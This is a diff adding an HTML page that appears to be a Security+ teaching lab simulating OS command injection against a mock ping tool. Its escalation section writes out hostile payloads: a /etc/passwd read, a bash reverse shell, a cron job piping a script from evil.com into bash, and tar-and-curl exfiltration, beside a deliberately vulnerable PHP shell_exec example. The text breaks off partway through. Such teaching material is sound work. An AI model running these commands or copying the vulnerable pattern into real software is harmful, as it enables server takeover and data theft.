@@ -1,0 +1,1478 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Command Injection Simulator — Security+ Lab</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Inter:wght@300;400;500&display=swap');
+
+  :root {
+    --bg:         #060b08;
+    --surface:    #0a100c;
+    --panel:      #0e1510;
+    --border:     #1a2e1e;
+    --red:        #ff3e3e;
+    --red-dim:    #cc2222;
+    --green:      #00e676;
+    --green-dim:  #00a050;
+    --green-dark: #003a18;
+    --amber:      #ffaa00;
+    --blue:       #4da6ff;
+    --teal:       #00e5cc;
+    --teal-dim:   #009e8a;
+    --muted:      #2e5038;
+    --text:       #b8d4be;
+    --text-dim:   #5a7a60;
+    --mono:       'Share Tech Mono', monospace;
+    --ui:         'Rajdhani', sans-serif;
+    --body:       'Inter', sans-serif;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--body);
+    font-size: 14px;
+    line-height: 1.6;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg, transparent, transparent 2px,
+      rgba(0,0,0,0.06) 2px, rgba(0,0,0,0.06) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* ── HEADER ── */
+  header {
+    border-bottom: 1px solid var(--border);
+    padding: 18px 32px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    background: var(--surface);
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+
+  .threat-badge {
+    background: var(--green);
+    color: #000;
+    font-family: var(--mono);
+    font-size: 10px;
+    font-weight: bold;
+    padding: 3px 8px;
+    letter-spacing: 2px;
+    clip-path: polygon(6px 0%, 100% 0%, calc(100% - 6px) 100%, 0% 100%);
+  }
+
+  header h1 {
+    font-family: var(--ui);
+    font-size: 22px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    color: #fff;
+  }
+
+  header h1 span { color: var(--green); }
+
+  .course-tag {
+    margin-left: auto;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+    border: 1px solid var(--border);
+    padding: 4px 10px;
+  }
+
+  /* ── PROGRESS ── */
+  .progress-bar { height: 3px; background: var(--border); }
+  .progress-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--green-dim), var(--green));
+    transition: width 0.4s ease;
+    width: 25%;
+  }
+
+  /* ── LAYOUT ── */
+  .container { max-width: 1200px; margin: 0 auto; padding: 28px 32px 60px; }
+
+  /* ── PHASE NAV ── */
+  .phase-nav {
+    display: flex;
+    gap: 0;
+    margin-bottom: 32px;
+    border: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  .phase-btn {
+    flex: 1;
+    background: var(--surface);
+    border: none;
+    border-right: 1px solid var(--border);
+    color: var(--text-dim);
+    font-family: var(--ui);
+    font-size: 13px;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+    padding: 12px 8px;
+    cursor: pointer;
+    transition: all 0.2s;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+  }
+
+  .phase-btn:last-child { border-right: none; }
+
+  .phase-btn .num {
+    font-family: var(--mono);
+    font-size: 18px;
+    color: var(--border);
+    transition: color 0.2s;
+  }
+
+  .phase-btn:hover { background: var(--panel); color: var(--text); }
+  .phase-btn:hover .num { color: var(--muted); }
+
+  .phase-btn.active {
+    background: var(--panel);
+    color: var(--green);
+    border-bottom: 2px solid var(--green);
+  }
+
+  .phase-btn.active .num { color: var(--green); }
+  .phase-btn.done { color: var(--green-dim); }
+  .phase-btn.done .num { color: var(--green-dim); }
+
+  /* ── PHASE PANELS ── */
+  .phase { display: none; }
+  .phase.active { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
+  .phase.single { display: block; }
+  .phase.wide { grid-template-columns: 1fr; }
+  .full { grid-column: 1 / -1; }
+
+  /* ── CARD ── */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 24px;
+    position: relative;
+  }
+
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 2px;
+  }
+
+  .card.red::before    { background: var(--red); }
+  .card.green::before  { background: var(--green); }
+  .card.amber::before  { background: var(--amber); }
+  .card.blue::before   { background: var(--blue); }
+  .card.teal::before   { background: var(--teal); }
+
+  .card-title {
+    font-family: var(--ui);
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .card-title .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--muted); }
+  .card.red .card-title .dot   { background: var(--red); }
+  .card.green .card-title .dot { background: var(--green); }
+  .card.amber .card-title .dot { background: var(--amber); }
+  .card.blue .card-title .dot  { background: var(--blue); }
+  .card.teal .card-title .dot  { background: var(--teal); }
+
+  /* ── CONCEPT ── */
+  .concept {
+    font-size: 13px;
+    color: var(--text-dim);
+    line-height: 1.7;
+    margin-bottom: 14px;
+  }
+
+  .concept strong { color: var(--text); }
+  .concept .highlight { color: var(--green); font-family: var(--mono); font-size: 12px; }
+  .concept .danger { color: var(--red); }
+  .concept .safe { color: var(--teal); }
+
+  /* ── TERMINAL ── */
+  .terminal {
+    background: #000;
+    border: 1px solid var(--border);
+    border-radius: 0;
+    overflow: hidden;
+  }
+
+  .terminal-bar {
+    background: #111;
+    border-bottom: 1px solid var(--border);
+    padding: 8px 14px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .terminal-dots { display: flex; gap: 5px; }
+  .terminal-dots span { width: 10px; height: 10px; border-radius: 50%; background: var(--border); }
+  .terminal-dots span:nth-child(1) { background: #ff5f57; }
+  .terminal-dots span:nth-child(2) { background: #febc2e; }
+  .terminal-dots span:nth-child(3) { background: #28c840; }
+
+  .terminal-title {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-dim);
+    flex: 1;
+    text-align: center;
+  }
+
+  .terminal-body {
+    padding: 14px 16px;
+    font-family: var(--mono);
+    font-size: 12px;
+    line-height: 1.8;
+    min-height: 120px;
+    max-height: 260px;
+    overflow-y: auto;
+    color: var(--green);
+  }
+
+  .t-prompt   { color: var(--green); }
+  .t-cmd      { color: #fff; }
+  .t-inject   { color: var(--red); font-weight: bold; }
+  .t-output   { color: #aaa; }
+  .t-error    { color: var(--red); }
+  .t-success  { color: var(--green); }
+  .t-warning  { color: var(--amber); }
+  .t-root     { color: var(--red); font-weight: bold; }
+  .t-info     { color: var(--teal); }
+  .t-muted    { color: #444; }
+
+  /* ── INPUT / LABEL ── */
+  input[type=text], textarea, select {
+    width: 100%;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 13px;
+    padding: 10px 14px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+
+  input[type=text]:focus, textarea:focus { border-color: var(--green); }
+  textarea { resize: vertical; min-height: 80px; }
+
+  label {
+    display: block;
+    font-family: var(--ui);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    color: var(--text-dim);
+    margin-bottom: 6px;
+    text-transform: uppercase;
+  }
+
+  .field { margin-bottom: 16px; }
+
+  /* ── BUTTONS ── */
+  .btn {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--ui);
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    padding: 10px 24px;
+    cursor: pointer;
+    transition: all 0.15s;
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .btn:hover { background: var(--panel); border-color: var(--muted); }
+
+  .btn.danger  { border-color: var(--red-dim); color: var(--red); }
+  .btn.danger:hover { background: rgba(255,62,62,0.08); border-color: var(--red); }
+
+  .btn.primary { border-color: var(--green-dim); color: var(--green); }
+  .btn.primary:hover { background: rgba(0,230,118,0.08); border-color: var(--green); }
+
+  .btn.teal-btn { border-color: var(--teal-dim); color: var(--teal); }
+  .btn.teal-btn:hover { background: rgba(0,229,204,0.08); }
+
+  .btn-row { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 12px; }
+
+  /* ── PAYLOAD GRID ── */
+  .payload-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+    margin-top: 12px;
+  }
+
+  .payload-item {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--red-dim);
+    padding: 10px 12px;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .payload-item:hover {
+    border-left-color: var(--red);
+    background: rgba(255,62,62,0.05);
+  }
+
+  .payload-item.safe {
+    border-left-color: var(--green-dim);
+  }
+  .payload-item.safe:hover {
+    border-left-color: var(--green);
+    background: rgba(0,230,118,0.05);
+  }
+
+  .payload-item .pl-name {
+    font-family: var(--ui);
+    font-size: 12px;
+    font-weight: 700;
+    color: var(--red);
+    margin-bottom: 4px;
+  }
+
+  .payload-item.safe .pl-name { color: var(--green); }
+
+  .payload-item .pl-code {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    word-break: break-all;
+  }
+
+  /* ── FLOW ── */
+  .flow {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin: 14px 0;
+    flex-wrap: wrap;
+  }
+
+  .flow-node {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    padding: 6px 12px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text);
+    white-space: nowrap;
+  }
+
+  .flow-node.red   { border-color: var(--red);   color: var(--red); }
+  .flow-node.green { border-color: var(--green);  color: var(--green); }
+  .flow-node.amber { border-color: var(--amber);  color: var(--amber); }
+  .flow-node.teal  { border-color: var(--teal);   color: var(--teal); }
+  .flow-arrow { color: var(--muted); font-size: 16px; }
+
+  /* ── DIVIDER ── */
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin: 24px 0 18px;
+    color: var(--muted);
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 2px;
+  }
+
+  .divider::before, .divider::after {
+    content: ''; flex: 1; height: 1px; background: var(--border);
+  }
+
+  /* ── CALLOUT ── */
+  .callout {
+    border-left: 3px solid var(--amber);
+    padding: 10px 14px;
+    background: rgba(255,170,0,0.06);
+    font-size: 12px;
+    color: var(--text-dim);
+    margin: 12px 0;
+    line-height: 1.6;
+  }
+
+  .callout.info   { border-color: var(--blue);   background: rgba(77,166,255,0.06); }
+  .callout.danger { border-color: var(--red);     background: rgba(255,62,62,0.06); color: var(--text); }
+  .callout.green  { border-color: var(--green);   background: rgba(0,230,118,0.06); }
+  .callout.teal   { border-color: var(--teal);    background: rgba(0,229,204,0.06); }
+  .callout strong { color: var(--text); }
+
+  /* ── CODE COMPARE ── */
+  .compare-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-bottom: 10px;
+  }
+
+  .compare-bad, .compare-good {
+    padding: 12px;
+    font-family: var(--mono);
+    font-size: 11px;
+    line-height: 1.7;
+    border: 1px solid;
+  }
+
+  .compare-bad  { border-color: var(--red-dim);   background: rgba(255,62,62,0.05); }
+  .compare-good { border-color: var(--green-dim);  background: rgba(0,230,118,0.04); }
+
+  .compare-label {
+    font-family: var(--ui);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    margin-bottom: 8px;
+    padding-bottom: 6px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .compare-bad  .compare-label { color: var(--red); }
+  .compare-good .compare-label { color: var(--green); }
+
+  code {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 1px 5px;
+    color: var(--amber);
+  }
+
+  .tag {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 1px;
+    padding: 2px 7px;
+    border: 1px solid;
+    margin: 2px;
+  }
+
+  .tag.vuln { border-color: var(--red-dim);   color: var(--red); }
+  .tag.safe { border-color: var(--green-dim); color: var(--green); }
+  .tag.info { border-color: var(--blue);      color: var(--blue); }
+  .tag.teal { border-color: var(--teal-dim);  color: var(--teal); }
+
+  /* ── OS PICKER ── */
+  .os-picker {
+    display: flex;
+    gap: 0;
+    margin-bottom: 20px;
+    border: 1px solid var(--border);
+    overflow: hidden;
+    width: fit-content;
+  }
+
+  .os-btn {
+    background: var(--surface);
+    border: none;
+    border-right: 1px solid var(--border);
+    color: var(--text-dim);
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 8px 18px;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .os-btn:last-child { border-right: none; }
+  .os-btn.active { background: var(--panel); color: var(--green); border-bottom: 2px solid var(--green); }
+  .os-btn:hover:not(.active) { background: var(--panel); color: var(--text); }
+
+  /* ── SEVERITY BADGE ── */
+  .severity {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 1px;
+    padding: 3px 10px;
+    border: 1px solid;
+  }
+
+  .severity.critical { border-color: var(--red);   color: var(--red);   background: rgba(255,62,62,0.08); }
+  .severity.high     { border-color: var(--amber);  color: var(--amber); background: rgba(255,170,0,0.08); }
+
+  /* ── MODAL ── */
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.88);
+    z-index: 1000;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .modal-overlay.show { display: flex; }
+
+  .modal {
+    background: var(--surface);
+    border: 1px solid var(--red);
+    border-top: 3px solid var(--red);
+    padding: 28px 32px;
+    max-width: 540px;
+    width: 90%;
+  }
+
+  .modal-title {
+    font-family: var(--ui);
+    font-size: 14px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    color: var(--red);
+    margin-bottom: 16px;
+    text-transform: uppercase;
+  }
+
+  .modal-body {
+    font-size: 12px;
+    color: var(--text);
+    line-height: 1.8;
+    margin-bottom: 20px;
+    font-family: var(--mono);
+  }
+
+  /* ── WEBAPP MOCK ── */
+  .webapp-mock {
+    background: #0f1a11;
+    border: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  .webapp-bar {
+    background: #0a0f0b;
+    border-bottom: 1px solid var(--border);
+    padding: 10px 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .webapp-url {
+    flex: 1;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-dim);
+    padding: 4px 10px;
+  }
+
+  .webapp-body {
+    padding: 20px;
+  }
+
+  .webapp-body h3 {
+    font-family: var(--ui);
+    font-size: 15px;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 14px;
+  }
+
+  .webapp-body .ping-result {
+    background: #000;
+    border: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 12px;
+    min-height: 70px;
+    color: var(--green);
+    line-height: 1.8;
+    margin-top: 10px;
+  }
+
+  /* ── ESCALATION STEPS ── */
+  .esc-step {
+    display: flex;
+    gap: 14px;
+    padding: 12px;
+    border: 1px solid var(--border);
+    margin-bottom: 8px;
+    background: var(--panel);
+    cursor: pointer;
+    transition: all 0.15s;
+    align-items: flex-start;
+  }
+
+  .esc-step:hover { border-color: var(--red-dim); background: rgba(255,62,62,0.04); }
+  .esc-step.done  { border-color: var(--red-dim); background: rgba(255,62,62,0.06); }
+
+  .esc-num {
+    font-family: var(--mono);
+    font-size: 18px;
+    color: var(--border);
+    min-width: 28px;
+    transition: color 0.2s;
+  }
+
+  .esc-step.done .esc-num { color: var(--red); }
+
+  .esc-title {
+    font-family: var(--ui);
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--text);
+    margin-bottom: 4px;
+  }
+
+  .esc-desc {
+    font-size: 12px;
+    color: var(--text-dim);
+    font-family: var(--mono);
+  }
+
+  .esc-step.done .esc-title { color: var(--red); }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="threat-badge">OWASP A03</div>
+  <h1>Command <span>Injection</span> Simulator</h1>
+  <div class="course-tag">SECURITY+ LAB // CIS108</div>
+</header>
+
+<div class="progress-bar">
+  <div class="progress-fill" id="progressFill"></div>
+</div>
+
+<div class="container">
+
+  <nav class="phase-nav">
+    <button class="phase-btn active" onclick="goPhase(1)">
+      <span class="num">01</span>CONCEPT
+    </button>
+    <button class="phase-btn" onclick="goPhase(2)">
+      <span class="num">02</span>BASIC INJECTION
+    </button>
+    <button class="phase-btn" onclick="goPhase(3)">
+      <span class="num">03</span>ESCALATION
+    </button>
+    <button class="phase-btn" onclick="goPhase(4)">
+      <span class="num">04</span>DEFENSES
+    </button>
+  </nav>
+
+  <!-- ═══════════════════════════════════════════
+       PHASE 1 — CONCEPT
+  ════════════════════════════════════════════ -->
+  <div class="phase active wide" id="phase1">
+
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;margin-bottom:24px;">
+
+      <div class="card teal">
+        <div class="card-title"><span class="dot"></span>WHAT IS COMMAND INJECTION?</div>
+        <p class="concept">
+          <strong>Command Injection</strong> occurs when an attacker supplies input to an application that is <strong>passed directly to a system shell</strong> without proper sanitization. The operating system executes the attacker's commands with the same privileges as the web application process.
+        </p>
+        <p class="concept">
+          Unlike SQL Injection — which targets a database — command injection targets the <strong>underlying operating system</strong>. A successful attack gives the attacker a foothold on the server itself: they can read files, create users, download malware, or pivot to internal networks.
+        </p>
+        <div class="callout danger">
+          <strong>Impact:</strong> Full server compromise, lateral movement, data exfiltration, ransomware deployment, persistent backdoor installation — one of the highest-severity injection types.
+        </div>
+        <div style="margin-top:12px;">
+          <span class="severity critical">● CRITICAL</span>
+          <span style="font-family:var(--mono);font-size:10px;color:var(--text-dim);margin-left:10px;">CVSS v3: up to 10.0</span>
+        </div>
+      </div>
+
+      <div class="card red">
+        <div class="card-title"><span class="dot"></span>HOW IT WORKS</div>
+        <p class="concept" style="margin-bottom:10px;">A web app offers a "ping" tool. The developer builds the OS command like this:</p>
+
+        <div class="terminal" style="margin-bottom:14px;">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span></span><span></span><span></span></div>
+            <div class="terminal-title">server-side code (PHP)</div>
+          </div>
+          <div class="terminal-body" style="min-height:auto;max-height:none;padding:12px 16px;">
+<span class="t-muted">// Developer's intent: ping the user-supplied host</span>
+<span class="t-output">$cmd = "ping -c 4 " . <span class="t-warning">$_GET['host']</span>;</span>
+<span class="t-output">shell_exec($cmd);</span>
+<span class="t-muted"></span>
+<span class="t-muted">// Intended: ping -c 4 google.com</span>
+<span class="t-error">// Injected: ping -c 4 google.com; cat /etc/passwd</span>
+          </div>
+        </div>
+
+        <p class="concept" style="margin-bottom:8px;">The shell processes the semicolon as a <strong>command separator</strong> — both commands run:</p>
+
+        <div class="flow">
+          <div class="flow-node teal">user input</div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-node">shell_exec()</div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-node red">OS executes both cmds</div>
+        </div>
+
+        <div class="callout info" style="margin-top:8px;">
+          <strong>Key principle:</strong> The shell doesn't know where the developer's command ends and the attacker's begins. It sees valid shell syntax and executes all of it.
+        </div>
+      </div>
+
+    </div>
+
+    <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:24px;margin-bottom:24px;">
+
+      <div class="card amber">
+        <div class="card-title"><span class="dot"></span>INJECTION OPERATORS</div>
+        <p class="concept" style="margin-bottom:10px;">Shell metacharacters that let attackers chain commands:</p>
+        <div style="display:flex;flex-direction:column;gap:6px;">
+          <div class="callout" style="margin:0;padding:8px 12px;font-family:var(--mono);font-size:11px;"><span style="color:var(--amber);">;</span> &nbsp;&nbsp;<span style="color:var(--text-dim);">Run second cmd regardless of first</span></div>
+          <div class="callout" style="margin:0;padding:8px 12px;font-family:var(--mono);font-size:11px;"><span style="color:var(--amber);">&&</span> &nbsp;<span style="color:var(--text-dim);">Run second cmd only if first succeeds</span></div>
+          <div class="callout" style="margin:0;padding:8px 12px;font-family:var(--mono);font-size:11px;"><span style="color:var(--amber);">||</span> &nbsp;<span style="color:var(--text-dim);">Run second cmd only if first fails</span></div>
+          <div class="callout" style="margin:0;padding:8px 12px;font-family:var(--mono);font-size:11px;"><span style="color:var(--amber);">|</span> &nbsp;&nbsp;<span style="color:var(--text-dim);">Pipe output of first into second</span></div>
+          <div class="callout" style="margin:0;padding:8px 12px;font-family:var(--mono);font-size:11px;"><span style="color:var(--amber);">`cmd`</span><span style="color:var(--text-dim);"> Backtick: substitute cmd output</span></div>
+          <div class="callout" style="margin:0;padding:8px 12px;font-family:var(--mono);font-size:11px;"><span style="color:var(--amber);">$(cmd)</span><span style="color:var(--text-dim);"> Subshell substitution (bash)</span></div>
+        </div>
+      </div>
+
+      <div class="card blue">
+        <div class="card-title"><span class="dot"></span>LINUX vs WINDOWS</div>
+        <p class="concept" style="margin-bottom:10px;">Payloads differ by OS. Testers probe both:</p>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+          <div>
+            <div style="font-family:var(--ui);font-size:11px;color:var(--teal);font-weight:700;margin-bottom:6px;letter-spacing:1px;">LINUX / UNIX</div>
+            <div style="font-family:var(--mono);font-size:10px;color:var(--text-dim);line-height:2;">
+              <span class="tag teal">;</span> <span class="tag teal">&&</span> <span class="tag teal">||</span><br>
+              <code style="color:var(--teal);">cat /etc/passwd</code><br>
+              <code style="color:var(--teal);">id</code><br>
+              <code style="color:var(--teal);">whoami</code><br>
+              <code style="color:var(--teal);">ls -la /</code><br>
+              <code style="color:var(--teal);">uname -a</code>
+            </div>
+          </div>
+          <div>
+            <div style="font-family:var(--ui);font-size:11px;color:var(--amber);font-weight:700;margin-bottom:6px;letter-spacing:1px;">WINDOWS</div>
+            <div style="font-family:var(--mono);font-size:10px;color:var(--text-dim);line-height:2;">
+              <span class="tag info">&</span> <span class="tag info">&&</span> <span class="tag info">||</span><br>
+              <code style="color:var(--amber);">type C:\users.txt</code><br>
+              <code style="color:var(--amber);">whoami</code><br>
+              <code style="color:var(--amber);">ipconfig</code><br>
+              <code style="color:var(--amber);">dir C:\</code><br>
+              <code style="color:var(--amber);">net user</code>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="card green">
+        <div class="card-title"><span class="dot"></span>COMMON VULNERABLE FUNCTIONS</div>
+        <p class="concept" style="margin-bottom:10px;">Functions that pass input to the OS shell:</p>
+        <div style="display:flex;flex-direction:column;gap:6px;">
+          <div style="border:1px solid var(--border);padding:8px 12px;">
+            <div style="font-family:var(--ui);font-size:11px;font-weight:700;color:var(--amber);margin-bottom:3px;">PHP</div>
+            <div style="font-family:var(--mono);font-size:10px;color:var(--text-dim);">shell_exec() &nbsp; exec() &nbsp; system()<br>passthru() &nbsp; popen() &nbsp; proc_open()</div>
+          </div>
+          <div style="border:1px solid var(--border);padding:8px 12px;">
+            <div style="font-family:var(--ui);font-size:11px;font-weight:700;color:var(--blue);margin-bottom:3px;">Python</div>
+            <div style="font-family:var(--mono);font-size:10px;color:var(--text-dim);">os.system() &nbsp; os.popen()<br>subprocess.call(shell=True)</div>
+          </div>
+          <div style="border:1px solid var(--border);padding:8px 12px;">
+            <div style="font-family:var(--ui);font-size:11px;font-weight:700;color:var(--green);margin-bottom:3px;">Node.js</div>
+            <div style="font-family:var(--mono);font-size:10px;color:var(--text-dim);">child_process.exec()<br>child_process.execSync()</div>
+          </div>
+          <div style="border:1px solid var(--border);padding:8px 12px;">
+            <div style="font-family:var(--ui);font-size:11px;font-weight:700;color:var(--teal);margin-bottom:3px;">Java</div>
+            <div style="font-family:var(--mono);font-size:10px;color:var(--text-dim);">Runtime.exec() &nbsp; ProcessBuilder</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div style="display:flex;justify-content:flex-end;">
+      <button class="btn primary" onclick="goPhase(2)">NEXT: BASIC INJECTION →</button>
+    </div>
+
+  </div>
+
+  <!-- ═══════════════════════════════════════════
+       PHASE 2 — BASIC INJECTION
+  ════════════════════════════════════════════ -->
+  <div class="phase" id="phase2">
+
+    <div class="card teal">
+      <div class="card-title"><span class="dot"></span>VULNERABLE APP — NETWORK DIAGNOSTIC TOOL</div>
+
+      <div class="os-picker">
+        <button class="os-btn active" onclick="setOS('linux', this)">🐧 Linux</button>
+        <button class="os-btn" onclick="setOS('windows', this)">🪟 Windows</button>
+      </div>
+
+      <div class="webapp-mock">
+        <div class="webapp-bar">
+          <div class="terminal-dots"><span></span><span></span><span></span></div>
+          <div class="webapp-url" id="webappUrl">http://systools.internal/ping?host=</div>
+        </div>
+        <div class="webapp-body">
+          <h3 id="toolTitle">🌐 Network Ping Tool</h3>
+          <p style="font-size:12px;color:var(--text-dim);margin-bottom:14px;" id="toolDesc">Enter a hostname or IP address to ping. Results will be displayed below.</p>
+          <div class="field">
+            <label id="inputLabel">Hostname / IP Address</label>
+            <input type="text" id="hostInput" placeholder="e.g.  google.com; cat /etc/passwd">
+          </div>
+          <button class="btn danger" onclick="runPing()" style="width:100%;justify-content:center;">▶ RUN DIAGNOSTIC</button>
+          <div style="margin-top:12px;">
+            <label>OUTPUT</label>
+            <div class="ping-result" id="pingOutput">Awaiting input...</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card red">
+      <div class="card-title"><span class="dot"></span>PAYLOAD LIBRARY</div>
+      <p class="concept" style="margin-bottom:14px;">Click a payload to load it into the tool. Observe how each operator behaves differently in the output window.</p>
+
+      <div id="payloadLibrary">
+        <!-- Populated by JS based on OS selection -->
+      </div>
+
+      <div class="divider">LIVE SERVER COMMAND</div>
+      <label>CONSTRUCTED OS COMMAND (as executed by the server)</label>
+      <div class="terminal" style="margin-top:8px;">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span></span><span></span><span></span></div>
+          <div class="terminal-title" id="shellTitle">bash — shell_exec()</div>
+        </div>
+        <div class="terminal-body" style="min-height:auto;max-height:none;padding:10px 16px;" id="liveCommand">
+          <span class="t-muted">$ </span><span class="t-cmd" id="lcText">ping -c 4 </span>
+        </div>
+      </div>
+    </div>
+
+    <div class="full">
+      <div class="card amber">
+        <div class="card-title"><span class="dot"></span>SERVER EXECUTION LOG</div>
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span></span><span></span><span></span></div>
+            <div class="terminal-title">server process log</div>
+          </div>
+          <div class="terminal-body" id="execLog" style="max-height:180px;">
+            <span class="t-success">[READY]</span><span class="t-muted"> Diagnostic server started. Awaiting requests...</span>
+          </div>
+        </div>
+        <div class="btn-row"><button class="btn" onclick="clearLog('execLog')">CLEAR LOG</button></div>
+      </div>
+    </div>
+
+    <div class="full" style="display:flex;justify-content:space-between;">
+      <button class="btn" onclick="goPhase(1)">← BACK</button>
+      <button class="btn primary" onclick="goPhase(3)">NEXT: ESCALATION →</button>
+    </div>
+
+  </div>
+
+  <!-- ═══════════════════════════════════════════
+       PHASE 3 — ESCALATION CHAIN
+  ════════════════════════════════════════════ -->
+  <div class="phase" id="phase3">
+
+    <div class="card red">
+      <div class="card-title"><span class="dot"></span>ATTACK ESCALATION CHAIN</div>
+      <p class="concept" style="margin-bottom:16px;">
+        Real-world command injection attacks follow a predictable escalation path. Click each step to simulate what an attacker does after gaining initial execution on the server.
+      </p>
+
+      <div id="esc1" class="esc-step" onclick="runEscStep(1)">
+        <div class="esc-num">01</div>
+        <div>
+          <div class="esc-title">Reconnaissance — Confirm Execution</div>
+          <div class="esc-desc">; id &nbsp;&amp;&amp;&nbsp; whoami &nbsp;&amp;&amp;&nbsp; uname -a</div>
+        </div>
+      </div>
+
+      <div id="esc2" class="esc-step" onclick="runEscStep(2)">
+        <div class="esc-num">02</div>
+        <div>
+          <div class="esc-title">Read Sensitive Files</div>
+          <div class="esc-desc">; cat /etc/passwd &nbsp;|&nbsp; head -20</div>
+        </div>
+      </div>
+
+      <div id="esc3" class="esc-step" onclick="runEscStep(3)">
+        <div class="esc-num">03</div>
+        <div>
+          <div class="esc-title">Network Enumeration</div>
+          <div class="esc-desc">; ifconfig &nbsp;&amp;&amp;&nbsp; netstat -an &nbsp;&amp;&amp;&nbsp; cat /etc/hosts</div>
+        </div>
+      </div>
+
+      <div id="esc4" class="esc-step" onclick="runEscStep(4)">
+        <div class="esc-num">04</div>
+        <div>
+          <div class="esc-title">Deploy Reverse Shell</div>
+          <div class="esc-desc">; bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</div>
+        </div>
+      </div>
+
+      <div id="esc5" class="esc-step" onclick="runEscStep(5)">
+        <div class="esc-num">05</div>
+        <div>
+          <div class="esc-title">Establish Persistence</div>
+          <div class="esc-desc">; echo "* * * * * curl http://evil.com/shell.sh | bash" | crontab -</div>
+        </div>
+      </div>
+
+      <div id="esc6" class="esc-step" onclick="runEscStep(6)">
+        <div class="esc-num">06</div>
+        <div>
+          <div class="esc-title">Data Exfiltration</div>
+          <div class="esc-desc">; tar czf - /var/www/html | curl -X POST --data-binary @- http://evil.com/exfil</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card amber">
+      <div class="card-title"><span class="dot"></span>SIMULATED SERVER TERMINAL</div>
+      <div class="terminal" style="height:100%;min-height:400px;">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span></span><span></span><span></span></div>
+          <div class="terminal-title" id="escTermTitle">www-data@systools-server:~$</div>
+        </div>
+        <div class="terminal-body" style="max-height:500px;min-height:380px;" id="escTerminal">
